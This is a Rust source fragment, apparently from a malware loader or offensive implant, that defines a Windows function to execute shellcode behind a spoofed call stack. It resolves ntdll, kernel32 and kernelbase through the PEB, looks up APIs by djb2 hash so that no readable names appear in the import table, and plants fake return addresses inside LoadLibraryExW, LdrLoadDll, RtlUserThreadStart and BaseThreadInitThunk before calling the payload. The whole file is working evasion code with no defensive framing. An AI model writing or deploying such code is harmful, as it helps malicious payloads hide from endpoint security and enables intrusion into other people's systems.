#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn spoof_and_call(shellcode_fn: extern "C" fn()) {
    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};

    // Resolve module bases from PEB (no GetModuleHandle call-site string in import table)
    const NTDLL_H:  u32 = djb2_hash_lower(b"ntdll.dll");
    const K32_H:    u32 = djb2_hash_lower(b"kernel32.dll");
    const KBASE_H:  u32 = djb2_hash_lower(b"kernelbase.dll");

    let ntdll = peb_get_module_base(NTDLL_H);
    let k32   = peb_get_module_base(K32_H);
    let kbase = peb_get_module_base(KBASE_H);

    // Resolve function addresses by hash (no GetProcAddress or plaintext names)
    let rts      = if !ntdll.is_null() { resolve_by_hash(ntdll, djb2_hash(b"RtlUserThreadStart")) } else { None };
    let btit     = if !k32.is_null()   { resolve_by_hash(k32,   djb2_hash(b"BaseThreadInitThunk")) } else { None };
    let ldr      = if !ntdll.is_null() { resolve_by_hash(ntdll, djb2_hash(b"LdrLoadDll")) } else { None };
    let ldrp_ptr = if !ntdll.is_null() { resolve_by_hash(ntdll, djb2_hash(b"LdrpLoadDll")) } else { None };
    let llew     = if !kbase.is_null() { resolve_by_hash(kbase, djb2_hash(b"LoadLibraryExW")) } else { None };

    let f1 = llew.map(|p| p as usize + 0x1B0).unwrap_or(0);
    let f2 = ldr.map(|p|  p as usize + 0x9F).unwrap_or(0);
    let f3 = ldrp_ptr.map(|p| p as usize + 0x1F3)
        .or_else(|| ldr.map(|p| p as usize + 0x150))
        .unwrap_or(0);
    let f4 = rts.map(|p|  p as usize + 0x14).unwrap_or(0);
    let f5 = btit.map(|p| p as usize + 0x10).unwrap_or(0);

    core::arch::asm!(
        "sub rsp, 0x60",
        "mov qword ptr [rsp+0x58], {f5}",
        "mov qword ptr [rsp+0x50], {f4}",
        "mov qword ptr [rsp+0x48], {f3}",
        "mov qword ptr [rsp+0x40], {f2}",
        "mov qword ptr [rsp+0x38], {f1}",
        "call {fn}",
        "add rsp, 0x60",
        fn = in(reg) shellcode_fn,
        f1 = in(reg) f1,
        f2 = in(reg) f2,
        f3 = in(reg) f3,
        f4 = in(reg) f4,
        f5 = in(reg) f5,
        options(nostack),
    );
}
